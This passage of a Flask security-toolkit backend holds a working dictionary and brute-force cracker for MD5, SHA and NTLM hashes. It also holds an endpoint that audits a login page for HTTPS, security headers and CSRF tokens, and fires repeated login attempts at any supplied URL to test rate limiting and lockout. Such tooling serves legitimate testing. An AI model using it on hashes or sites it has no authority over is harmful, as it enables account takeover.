        return jsonify({'tokens': parser.tokens, 'status': r.status_code})
    except Exception as e:
        return jsonify({'error': str(e)})



# ══════════════════════════════════════════
# DEFENSE PHASE BACKEND
# ══════════════════════════════════════════
import hashlib

hash_jobs = {}

def detect_hash_type(h):
    h = h.strip()
    if h.startswith('$2') and len(h) == 60: return 'bcrypt'
    if h.startswith('$1$'): return 'md5crypt'
    if h.startswith('$5$'): return 'sha256crypt'
    if h.startswith('$6$'): return 'sha512crypt'
    if re.match(r'^[0-9a-fA-F]{32}$', h): return 'md5'
    if re.match(r'^[0-9a-fA-F]{40}$', h): return 'sha1'
    if re.match(r'^[0-9a-fA-F]{64}$', h): return 'sha256'
    if re.match(r'^[0-9a-fA-F]{128}$', h): return 'sha512'
    return 'unknown'

def check_hash(hash_type, candidate, target_hash):
    target = target_hash.strip().lower()
    try:
        if hash_type in ('md5', 'auto') or (hash_type == 'ntlm'):
            if hashlib.md5(candidate.encode()).hexdigest() == target:
                return True
        if hash_type in ('sha1', 'auto'):
            if hashlib.sha1(candidate.encode()).hexdigest() == target:
                return True
        if hash_type in ('sha256', 'auto'):
            if hashlib.sha256(candidate.encode()).hexdigest() == target:
                return True
        if hash_type in ('sha512', 'auto'):
            if hashlib.sha512(candidate.encode()).hexdigest() == target:
                return True
        # NTLM
        if hash_type in ('ntlm', 'auto'):
            import hashlib as hl
            ntlm = hl.new('md4', candidate.encode('utf-16-le')).hexdigest() if False else None
            try:
                import hashlib
                h = hashlib.new('md4')
                h.update(candidate.encode('utf-16-le'))
                if h.hexdigest() == target:
                    return True
            except Exception:
                pass
    except Exception:
        pass
    return False

def hash_crack_worker(job_id, config):
    job = hash_jobs[job_id]
    job.update(status='running', found=False, plaintext='', attempts=0, log=[], done=False)

    def log(msg): job['log'].append(msg)

    target_hash = config['hash'].strip()
    hash_type   = config['hash_type']
    mode        = config['mode']

    if hash_type == 'auto':
        hash_type = detect_hash_type(target_hash)
        log(f"[*] Auto-detected : {hash_type.upper()}")
    else:
        log(f"[*] Hash type     : {hash_type.upper()}")

    log(f"[*] Target hash   : {target_hash[:32]}{'...' if len(target_hash)>32 else ''}")
    log(f"[*] Mode          : {'DICTIONARY' if mode == 'dict' else 'BRUTE FORCE'}")
    log("")

    if hash_type in ('bcrypt','md5crypt','sha256crypt','sha512crypt','unknown'):
        log(f"[!] Hash type '{hash_type}' not supported for offline cracking in this version.")
        log("[i] Supported: MD5, SHA-1, SHA-256, SHA-512, NTLM")
        job.update(status='error', done=True)
        return

    def try_candidate(candidate):
        return check_hash(hash_type, candidate, target_hash)

    def run_candidates(it):
        for cand in it:
            if job.get('cancelled'):
                log("[!] Cancelled.")
                return False
            cand = cand.strip() if hasattr(cand,'strip') else cand
            if not cand:
                continue
            job['attempts'] += 1
            if job['attempts'] % 100 == 0:
                log(f"[*] Tried {job['attempts']} candidates...")
            if try_candidate(cand):
                job.update(found=True, plaintext=cand, status='found', hash_type=hash_type)
                log("")
                log(f"[+] HASH CRACKED!")
                log(f"[+] Plaintext : {cand}")
                log(f"[+] Hash type : {hash_type.upper()}")
                log(f"[+] Attempts  : {job['attempts']}")
                return True
        return False

    found = False
    if mode == 'dict':
        wl_key  = config.get('wordlist', 'rockyou')
        wl_path = SYSTEM_WORDLISTS.get(wl_key, wl_key)
        log(f"[*] Wordlist      : {os.path.basename(wl_path)}")
        log("")
        try:
            with open(wl_path, 'r', errors='ignore') as wf:
                found = run_candidates(wf)
        except FileNotFoundError:
            log(f"[ERROR] Wordlist not found: {wl_path}")
            job['status'] = 'error'
    else:
        import itertools as _it
        charset = config.get('charset','abcdefghijklmnopqrstuvwxyz0123456789')
        min_len = config.get('min_len', 1)
        max_len = config.get('max_len', 6)
        log(f"[*] Charset       : {charset[:40]}...")
        log(f"[*] Length range  : {min_len}–{max_len}")
        log("")
        for length in range(min_len, max_len+1):
            if found or job.get('cancelled'): break
            log(f"[*] Trying length {length}...")
            found = run_candidates(''.join(c) for c in _it.product(charset, repeat=length))

    if not found and not job.get('cancelled') and job['status'] != 'error':
        job['status'] = 'not_found'
        log("")
        log(f"[X] Hash not cracked.")
        log(f"[i] Tried {job['attempts']} candidates.")

    job['done'] = True


@app.route('/hash_crack', methods=['POST'])
def hash_crack():
    h        = request.form.get('hash','').strip()
    htype    = request.form.get('hash_type','auto')
    mode     = request.form.get('mode','dict')
    if not h:
        return jsonify({'error':'Hash is required'}), 400

    job_id = str(uuid.uuid4())[:8]
    config = {
        'hash': h, 'hash_type': htype, 'mode': mode,
        'wordlist': request.form.get('wordlist','rockyou'),
        'charset':  request.form.get('charset','abcdefghijklmnopqrstuvwxyz0123456789'),
        'min_len':  max(1, int(request.form.get('min_len',1))),
        'max_len':  min(8,  int(request.form.get('max_len',6))),
    }
    hash_jobs[job_id] = {
        'status':'starting','found':False,'plaintext':'','hash_type':htype,
        'attempts':0,'log':[],'done':False,'cancelled':False
    }
    t = threading.Thread(target=hash_crack_worker, args=(job_id, config), daemon=True)
    t.start()
    return jsonify({'job_id': job_id})


@app.route('/hash_status/<job_id>')
def hash_status(job_id):
    if job_id not in hash_jobs:
        return jsonify({'error':'Job not found'}),404
    j = hash_jobs[job_id]
    return jsonify({
        'status': j['status'], 'found': j['found'],
        'plaintext': j['plaintext'], 'hash_type': j.get('hash_type',''),
        'attempts': j['attempts'], 'log': j['log'], 'done': j['done']
    })


@app.route('/hash_cancel/<job_id>', methods=['POST'])
def hash_cancel(job_id):
    if job_id in hash_jobs:
        hash_jobs[job_id]['cancelled'] = True
    return jsonify({'ok':True})


@app.route('/api/policy_audit', methods=['POST'])
def policy_audit():
    """Audit a login form for common security weaknesses."""
    if not HAS_REQUESTS:
        return jsonify({'error':'requests library not installed'})

    d        = request.get_json(force=True)
    url      = d.get('url','').strip()
    username = d.get('username','admin')
    password = d.get('password','wrongpassword123')
    ufield   = d.get('user_field','username')
    pfield   = d.get('pass_field','password')

    if not url:
        return jsonify({'error':'URL required'})

    checks = []

    def chk(name, status, detail, recommendation=''):
        checks.append({'name':name,'status':status,'detail':detail,'recommendation':recommendation})

    try:
        session = req_lib.Session()
        session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'

        # 1. HTTPS check
        if url.startswith('https://'):
            chk('HTTPS', 'PASS', 'Login page uses HTTPS encryption')
        else:
            chk('HTTPS', 'FAIL', 'Login page uses plain HTTP — credentials sent unencrypted',
                'Use HTTPS with a valid SSL certificate')

        # 2. Basic reachability
        try:
            page = session.get(url, timeout=8)
            chk('Reachability', 'PASS', f'Server responded HTTP {page.status_code}')
        except Exception as e:
            chk('Reachability', 'FAIL', f'Could not reach server: {str(e)[:60]}')
            return jsonify({'checks': checks})

        # 3. Security headers
        headers = page.headers
        security_headers = [
            ('X-Frame-Options',       'Clickjacking protection'),
            ('X-Content-Type-Options','MIME sniffing protection'),
            ('X-XSS-Protection',      'XSS filter header'),
            ('Content-Security-Policy','Content security policy'),
            ('Strict-Transport-Security','HSTS header'),
        ]
        missing_headers = []
        for h, desc in security_headers:
            if h.lower() not in {k.lower() for k in headers.keys()}:
                missing_headers.append(h)

        if not missing_headers:
            chk('Security Headers', 'PASS', 'All major security headers present')
        else:
            chk('Security Headers', 'FAIL',
                f'Missing: {", ".join(missing_headers[:3])}',
                'Add security headers in your web server / Flask @after_request')

        # 4. CSRF token present
        from html.parser import HTMLParser
        class FormParser(HTMLParser):
            def __init__(self):
                super().__init__()
                self.has_csrf = False
                self.inputs = []
            def handle_starttag(self, tag, attrs):
                if tag == 'input':
                    d2 = dict(attrs)
                    self.inputs.append(d2.get('name',''))
                    n = d2.get('name','').lower()
                    v = d2.get('value','')
                    t = d2.get('type','').lower()
                    csrf_kw = ['csrf','token','_token','nonce','authenticity','verify','xsrf']
                    if t == 'hidden' and v and any(kw in n for kw in csrf_kw):
                        self.has_csrf = True

        fp = FormParser()
        fp.feed(page.text)

        if fp.has_csrf:
            chk('CSRF Protection', 'PASS', 'CSRF token found in login form')
        else:
            chk('CSRF Protection', 'FAIL',
                'No CSRF token detected in login form',
                'Add CSRF tokens to all forms (Flask-WTF, or manual hidden field)')

        # 5. Rate limiting — send 12 rapid requests
        import time as _t
        responses = []
        for i in range(12):
            try:
                r = session.post(url, data={ufield: username, pfield: password}, timeout=5, allow_redirects=True)
                responses.append(r.status_code)
            except Exception:
                responses.append(0)

        blocked = any(c in (429, 403, 503) for c in responses[5:])
        if blocked:
            chk('Rate Limiting', 'PASS', f'Server blocked requests after rapid attempts (got {set(responses[5:])})')
        else:
            chk('Rate Limiting', 'FAIL',
                f'12 rapid requests all succeeded (codes: {list(set(responses))})',
                'Implement rate limiting — max 5–10 requests/minute per IP')

        # 6. Account lockout — check if later responses differ from first
        first_len = len(session.post(url, data={ufield:username, pfield:'attempt1'}, timeout=5).text)
        later_responses = []
        for i in range(5):
            try:
                r = session.post(url, data={ufield:username, pfield:f'attempt_{i+10}'}, timeout=5)
                later_responses.append(len(r.text))
            except Exception:
                later_responses.append(0)

        # Lockout shows as a very different response size
        avg_later = sum(later_responses)/len(later_responses) if later_responses else 0
        if abs(avg_later - first_len) > 200:
            chk('Account Lockout', 'PASS', 'Response changed after multiple failures — possible lockout detected')
        else:
            chk('Account Lockout', 'WARN',
                'Response size consistent across all attempts — lockout not detected',
                'Implement account lockout after 5 failed attempts with 15-min cooldown')

        # 7. Server info disclosure
        server = headers.get('Server','') or headers.get('X-Powered-By','')
        if server and any(x in server.lower() for x in ['apache','nginx','php','python','flask','iis','express']):
            chk('Server Disclosure', 'FAIL',
                f'Server header reveals: {server}',
                'Remove or obscure Server and X-Powered-By headers')
        else:
            chk('Server Disclosure', 'PASS', 'No sensitive server info in headers')

        # 8. Password field autocomplete
        if 'autocomplete="off"' in page.text.lower() or 'autocomplete=\"off\"' in page.text:
            chk('Autocomplete', 'PASS', 'Password field has autocomplete=off')
        else:
            chk('Autocomplete', 'WARN',
                'Password field may allow browser autocomplete',
                'Add autocomplete="off" to the password input field')

    except Exception as e:
        import traceback
        chk('Audit Error', 'FAIL', str(e)[:100])

    return jsonify({'checks': checks})

if __name__ == '__main__':
    app.run(debug=True, port=5000)